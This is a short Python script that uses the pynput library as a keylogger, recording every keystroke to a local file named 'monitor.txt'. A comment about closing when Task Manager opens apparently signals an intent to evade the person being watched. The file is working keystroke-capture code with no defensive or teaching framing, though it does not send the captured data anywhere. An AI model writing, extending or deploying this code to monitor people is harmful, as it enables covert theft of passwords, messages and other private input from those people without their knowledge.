from pynput import keyboard

def on_press(key):
    try: 
        with open("monitor.txt", "a+") as text_file:
            if key == keyboard.Key.space:
                print(' ', end='', file=text_file)
            else:
                print('{0}'.format(
                key.char), end='', file=text_file)
    except AttributeError:
        with open("monitor.txt", "a+") as text_file:
            print('', file=text_file)
            print('{0}'.format(
                key), file=text_file)
    
#   close when task manager opens

# Collect events until released
with keyboard.Listener(
        on_press=on_press) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press)


listener.start()
